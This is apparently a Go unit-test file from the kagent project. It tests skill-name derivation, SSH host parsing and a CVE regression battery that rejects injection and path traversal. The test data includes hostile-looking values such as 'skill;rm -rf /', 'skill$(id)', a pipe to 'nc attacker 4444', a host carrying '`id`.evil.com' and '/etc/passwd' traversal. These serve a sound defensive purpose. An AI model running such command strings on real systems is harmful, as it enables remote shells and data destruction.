package agent

import (
	"testing"

	"github.com/kagent-dev/kagent/go/api/v1alpha2"
	"github.com/kagent-dev/kagent/go/core/internal/skillsinit"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	corev1 "k8s.io/api/core/v1"
)

func Test_ociSkillName(t *testing.T) {
	tests := []struct {
		name     string
		imageRef string
		want     string
	}{
		{name: "simple image:tag", imageRef: "skill:latest", want: "skill"},
		{name: "registry/org/skill:tag", imageRef: "ghcr.io/org/skill:v1", want: "skill"},
		{name: "localhost:5000/skill", imageRef: "localhost:5000/skill", want: "skill"},
		{name: "localhost:5000/skill:tag", imageRef: "localhost:5000/skill:v1", want: "skill"},
		{name: "registry:port/org/skill:tag", imageRef: "registry.example.com:8080/org/skill:v1", want: "skill"},
		{name: "digest ref", imageRef: "ghcr.io/org/skill@sha256:abc123", want: "skill"},
		{name: "tag and digest", imageRef: "ghcr.io/org/skill:v1@sha256:abc123", want: "skill"},
		{name: "deeply nested", imageRef: "registry.io/a/b/c/skill:latest", want: "skill"},
		{name: "no tag no digest", imageRef: "ghcr.io/org/skill", want: "skill"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ociSkillName(tt.imageRef)
			assert.Equal(t, tt.want, got)
		})
	}
}

func Test_gitSkillName(t *testing.T) {
	tests := []struct {
		name string
		ref  v1alpha2.GitRepo
		want string
	}{
		{
			name: "explicit name takes precedence",
			ref:  v1alpha2.GitRepo{URL: "https://github.com/org/repo.git", Name: "custom"},
			want: "custom",
		},
		{
			name: "strips .git suffix",
			ref:  v1alpha2.GitRepo{URL: "https://github.com/org/my-repo.git"},
			want: "my-repo",
		},
		{
			name: "no .git suffix",
			ref:  v1alpha2.GitRepo{URL: "https://github.com/org/my-repo"},
			want: "my-repo",
		},
		{
			name: "strips query params",
			ref:  v1alpha2.GitRepo{URL: "https://github.com/org/repo.git?token=abc"},
			want: "repo",
		},
		{
			name: "strips fragment",
			ref:  v1alpha2.GitRepo{URL: "https://github.com/org/repo.git#readme"},
			want: "repo",
		},
		{
			name: "strips query and fragment",
			ref:  v1alpha2.GitRepo{URL: "https://github.com/org/repo?foo=bar#baz"},
			want: "repo",
		},
		{
			name: "SSH URL",
			ref:  v1alpha2.GitRepo{URL: "git@github.com:org/repo.git"},
			want: "repo",
		},
		{
			name: "path last segment when name empty (monorepo)",
			ref: v1alpha2.GitRepo{
				URL:  "https://github.com/reponame/myskills.git",
				Path: "someskills/skill1",
			},
			want: "skill1",
		},
		{
			name: "path with leading and trailing slash",
			ref: v1alpha2.GitRepo{
				URL:  "https://github.com/reponame/myskills.git",
				Path: "/someskills/skill1/",
			},
			want: "skill1",
		},
		{
			name: "explicit name still wins over path",
			ref: v1alpha2.GitRepo{
				URL:  "https://github.com/reponame/myskills.git",
				Path: "someskills/skill1",
				Name: "custom",
			},
			want: "custom",
		},
		{
			name: "no path uses repo name",
			ref:  v1alpha2.GitRepo{URL: "https://github.com/reponame/myskills"},
			want: "myskills",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := gitSkillName(tt.ref)
			assert.Equal(t, tt.want, got)
		})
	}
}

func Test_gitSSHHost(t *testing.T) {
	tests := []struct {
		name   string
		rawURL string
		want   skillsinit.SSHHost
		wantOK bool
	}{
		{
			name:   "https repo is not ssh",
			rawURL: "https://github.com/org/repo.git",
			wantOK: false,
		},
		{
			name:   "scp-style ssh repo",
			rawURL: "git@github.com:org/repo.git",
			want:   skillsinit.SSHHost{Host: "github.com"},
			wantOK: true,
		},
		{
			name:   "ssh url with non-default port",
			rawURL: "ssh://git@gitea-ssh.gitea:2222/gitops/repo.git",
			want:   skillsinit.SSHHost{Host: "gitea-ssh.gitea", Port: "2222"},
			wantOK: true,
		},
		{
			name:   "ssh url without explicit port",
			rawURL: "ssh://git@gitea-ssh.gitea/gitops/repo.git",
			want:   skillsinit.SSHHost{Host: "gitea-ssh.gitea"},
			wantOK: true,
		},
		{
			name:   "git+ssh url with port",
			rawURL: "git+ssh://git@example.com:2222/org/repo.git",
			want:   skillsinit.SSHHost{Host: "example.com", Port: "2222"},
			wantOK: true,
		},
		{
			name:   "ssh url with default port 22 normalizes to empty",
			rawURL: "ssh://git@gitea-ssh.gitea:22/gitops/repo.git",
			want:   skillsinit.SSHHost{Host: "gitea-ssh.gitea"},
			wantOK: true,
		},
		{
			name:   "invalid ssh-like string",
			rawURL: "not-a-git-url",
			wantOK: false,
		},
		{
			name:   "scp-style with shell injection in host is rejected",
			rawURL: "git@foo$(id):repo.git",
			wantOK: false,
		},
		{
			name:   "scp-style with semicolon injection in host is rejected",
			rawURL: `git@bad";id;echo ":repo.git`,
			wantOK: false,
		},
		{
			name:   "ssh url with shell injection in host is rejected",
			rawURL: "ssh://git@host$(whoami)/org/repo.git",
			wantOK: false,
		},
		{
			name:   "ssh url with backtick injection in host is rejected",
			rawURL: "ssh://git@`id`.evil.com/org/repo.git",
			wantOK: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := gitSSHHost(tt.rawURL)
			assert.Equal(t, tt.wantOK, ok)
			assert.Equal(t, tt.want, got)
		})
	}
}

func Test_validateSubPath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr string
	}{
		{name: "empty is valid", path: "", wantErr: ""},
		{name: "simple relative path", path: "skills/k8s", wantErr: ""},
		{name: "single segment", path: "subdir", wantErr: ""},
		{name: "absolute path rejected", path: "/etc/passwd", wantErr: "relative path"},
		{name: "dotdot at start rejected", path: "../escape", wantErr: "relative path"},
		{name: "deep traversal rejected", path: "a/../../escape", wantErr: "relative path"},
		{name: "bare dotdot rejected", path: "..", wantErr: "relative path"},
		// filepath.IsLocal collapses ".." segments before evaluating: "a/../b" cleans to
		// "b" and "a/b/.." cleans to "a" — both are safe in-repo subdirs and accepted.
		{name: "dotdot in middle that cleans to local is ok", path: "a/../b", wantErr: ""},
		{name: "dotdot at end that cleans to local is ok", path: "a/b/..", wantErr: ""},
		{name: "dots in name are ok", path: "my.skill/v1.0", wantErr: ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateSubPath(tt.path)
			if tt.wantErr != "" {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.wantErr)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func Test_prepareSkillsInitConfig_duplicateNames(t *testing.T) {
	tests := []struct {
		name    string
		gitRefs []v1alpha2.GitRepo
		ociRefs []string
		wantErr string
	}{
		{
			name: "no duplicates",
			gitRefs: []v1alpha2.GitRepo{
				{URL: "https://github.com/org/skill-a", Ref: "main"},
				{URL: "https://github.com/org/skill-b", Ref: "main"},
			},
			wantErr: "",
		},
		{
			name: "duplicate git repos",
			gitRefs: []v1alpha2.GitRepo{
				{URL: "https://github.com/org/skill-a", Ref: "main"},
				{URL: "https://github.com/other/skill-a", Ref: "main"},
			},
			wantErr: `duplicate skill directory name "skill-a"`,
		},
		{
			name: "duplicate OCI refs",
			ociRefs: []string{
				"ghcr.io/org/skill:v1",
				"ghcr.io/other/skill:v2",
			},
			wantErr: `duplicate skill directory name "skill"`,
		},
		{
			name: "git and OCI collision",
			gitRefs: []v1alpha2.GitRepo{
				{URL: "https://github.com/org/my-skill", Ref: "main"},
			},
			ociRefs: []string{
				"ghcr.io/org/my-skill:v1",
			},
			wantErr: `duplicate skill directory name "my-skill"`,
		},
		{
			name: "explicit name avoids collision",
			gitRefs: []v1alpha2.GitRepo{
				{URL: "https://github.com/org/skill-a", Ref: "main", Name: "unique-a"},
				{URL: "https://github.com/org/skill-a", Ref: "v2", Name: "unique-b"},
			},
			wantErr: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := prepareSkillsInitConfig(tt.gitRefs, nil, tt.ociRefs, false, nil)
			if tt.wantErr != "" {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.wantErr)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func Test_prepareSkillsInitConfig_pathTraversal(t *testing.T) {
	_, err := prepareSkillsInitConfig(
		[]v1alpha2.GitRepo{
			{URL: "https://github.com/org/repo", Ref: "main", Path: "../escape"},
		},
		nil, nil, false, nil,
	)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "relative path")
}

func Test_prepareSkillsInitConfig_absolutePath(t *testing.T) {
	_, err := prepareSkillsInitConfig(
		[]v1alpha2.GitRepo{
			{URL: "https://github.com/org/repo", Ref: "main", Path: "/etc/passwd"},
		},
		nil, nil, false, nil,
	)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "relative path")
}

func Test_prepareSkillsInitConfig_authMountPath(t *testing.T) {
	data, err := prepareSkillsInitConfig(
		[]v1alpha2.GitRepo{{URL: "https://github.com/org/repo", Ref: "main"}},
		&corev1.LocalObjectReference{Name: "my-secret"},
		nil, false, nil,
	)
	require.NoError(t, err)
	assert.Equal(t, "/git-auth", data.AuthMountPath)
}

func Test_prepareSkillsInitConfig_sshHosts(t *testing.T) {
	data, err := prepareSkillsInitConfig(
		[]v1alpha2.GitRepo{
			{URL: "https://github.com/org/https-repo", Ref: "main"},
			{URL: "git@github.com:org/scp-repo.git", Ref: "main"},
			{URL: "ssh://git@gitea-ssh.gitea:22/gitops/ssh-repo.git", Ref: "main", Name: "ssh-repo"},
			{URL: "ssh://git@gitea-ssh.gitea:22/gitops/another-ssh-repo.git", Ref: "main", Name: "another-ssh-repo"},
		},
		&corev1.LocalObjectReference{Name: "ssh-secret"},
		nil,
		false, nil,
	)
	require.NoError(t, err)
	assert.Equal(t, []skillsinit.SSHHost{
		{Host: "gitea-ssh.gitea"},
		{Host: "github.com"},
	}, data.SSHHosts)
}

func Test_prepareSkillsInitConfig_sshHostsDedupesDefaultPort(t *testing.T) {
	data, err := prepareSkillsInitConfig(
		[]v1alpha2.GitRepo{
			{URL: "git@github.com:org/scp-repo.git", Ref: "main"},
			{URL: "ssh://git@github.com:22/org/ssh-repo.git", Ref: "main", Name: "ssh-repo"},
		},
		&corev1.LocalObjectReference{Name: "ssh-secret"},
		nil,
		false, nil,
	)
	require.NoError(t, err)
	assert.Equal(t, []skillsinit.SSHHost{
		{Host: "github.com"},
	}, data.SSHHosts)
}

func Test_prepareSkillsInitConfig_noAuthSkipsSSHHosts(t *testing.T) {
	data, err := prepareSkillsInitConfig(
		[]v1alpha2.GitRepo{
			{URL: "git@github.com:org/scp-repo.git", Ref: "main"},
			{URL: "ssh://git@gitea-ssh.gitea/gitops/ssh-repo.git", Ref: "main", Name: "ssh-repo"},
		},
		nil, // no auth secret
		nil,
		false, nil,
	)
	require.NoError(t, err)
	assert.Empty(t, data.SSHHosts, "SSH hosts should not be collected when authSecretRef is nil")
}

// Test_validateSkillName_rejectsInjection is the regression battery for the
// original CVE: any character that could escape the /skills/<name> directory
// or be re-interpreted by a shell (back when skills-init was a heredoc) must
// be rejected before it reaches the binary.
func Test_validateSkillName_rejectsInjection(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"empty", ""},
		{"dot", "."},
		{"dotdot", ".."},
		{"slash traversal", "../etc"},
		{"forward slash", "a/b"},
		{"backslash", "a\\b"},
		{"shell semicolon", "skill;rm -rf /"},
		{"command substitution", "skill$(id)"},
		{"backtick substitution", "skill`id`"},
		{"pipe", "skill|nc attacker 4444"},
		{"and", "skill&&id"},
		{"redirect", "skill>/etc/passwd"},
		{"newline", "skill\nrm -rf /"},
		{"carriage return", "skill\r\nrm"},
		{"null byte", "skill\x00trail"},
		{"glob star", "skill*"},
		{"glob question", "skill?"},
		{"space", "skill name"},
		{"tab", "skill\tname"},
		{"dollar var", "skill$HOME"},
		{"brace expansion", "skill{a,b}"},
		{"unicode dot-substitute", "skill․"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateSkillName(tc.in)
			require.Error(t, err, "validateSkillName(%q) must reject", tc.in)
		})
	}
}

// Test_validateSkillName_acceptsSafe documents the positive side of the
// allowlist so a future regex tightening doesn't silently break valid names.
func Test_validateSkillName_acceptsSafe(t *testing.T) {
	for _, in := range []string{"skill", "my-skill", "my_skill", "skill.v1", "Skill123", "a"} {
		t.Run(in, func(t *testing.T) {
			require.NoError(t, validateSkillName(in))
		})
	}
}

// Test_prepareSkillsInitConfig_explicitNameRejectsTraversal exercises the
// validation path when the CRD provides an explicit skill Name (rather than
// it being derived from the URL/image). This is the field that historically
// landed in a shell-templated script.
func Test_prepareSkillsInitConfig_explicitNameRejectsTraversal(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"traversal", "../escape"},
		{"absolute", "/etc/passwd"},
		{"semicolon", "skill;id"},
		{"command sub", "skill$(id)"},
		{"newline", "skill\nrm"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := prepareSkillsInitConfig(
				[]v1alpha2.GitRepo{
					{URL: "https://github.com/org/repo", Ref: "main", Name: tc.in},
				},
				nil, nil, false, nil,
			)
			require.Error(t, err)
		})
	}
}

// Test_prepareSkillsInitConfig_ociNameDerivationRejectsInjection verifies
// that an OCI image reference whose final path segment contains injection
// characters is rejected even though the registry would technically parse it.
// The derived name becomes a directory under /skills, so the allowlist must
// hold here too.
func Test_prepareSkillsInitConfig_ociNameDerivationRejectsInjection(t *testing.T) {
	// ociSkillName takes path.Base of the repo portion. Crafted refs where the
	// last segment contains shell metas must be rejected.
	cases := []string{
		"ghcr.io/org/skill;id",
		"ghcr.io/org/skill$(id)",
		"ghcr.io/org/skill name",
	}
	for _, ref := range cases {
		t.Run(ref, func(t *testing.T) {
			_, err := prepareSkillsInitConfig(nil, nil, []string{ref}, false, nil)
			require.Error(t, err, "ref %q should be rejected", ref)
		})
	}
}

// Test_prepareSkillsInitConfig_preservesInjectionStringsAsData proves the
// data-only contract: even when URL/Ref contain shell metacharacters, the
// translator does not reject them (URL/Ref aren't allowlisted — they're passed
// to git as argv) and reproduces them byte-for-byte in the config. Any
// "interpretation" of these strings would show up as a difference here.
func Test_prepareSkillsInitConfig_preservesInjectionStringsAsData(t *testing.T) {
	maliciousURL := "https://github.com/org/repo;rm -rf /$(id)`whoami`"
	maliciousRef := "main;rm -rf /"
	cfg, err := prepareSkillsInitConfig(
		[]v1alpha2.GitRepo{
			{
				URL:  maliciousURL,
				Ref:  maliciousRef,
				Name: "safe-name",
			},
		},
		nil, nil, false, nil,
	)
	require.NoError(t, err, "URL/Ref are not allowlisted; they flow as data")
	require.Len(t, cfg.GitRefs, 1)
	assert.Equal(t, maliciousURL, cfg.GitRefs[0].URL, "URL must be preserved verbatim — argv flow")
	assert.Equal(t, maliciousRef, cfg.GitRefs[0].Ref, "Ref must be preserved verbatim — argv flow")
}

// Test_prepareSkillsInitConfig_subPathRejectsInjection covers the SubPath
// branch with the same battery the original heredoc would have interpolated.
func Test_prepareSkillsInitConfig_subPathRejectsInjection(t *testing.T) {
	// "a/../b" is intentionally not in this list: filepath.Clean collapses it
	// to "b", which is a safe in-repo subdirectory, so we accept it. The
	// dangerous cases are escaping ".." and absolute paths.
	cases := []string{
		"../escape",
		"a/../../escape",
		"/etc/passwd",
	}
	for _, p := range cases {
		t.Run(p, func(t *testing.T) {
			_, err := prepareSkillsInitConfig(
				[]v1alpha2.GitRepo{
					{URL: "https://github.com/org/repo", Ref: "main", Path: p},
				},
				nil, nil, false, nil,
			)
			require.Error(t, err)
		})
	}
}
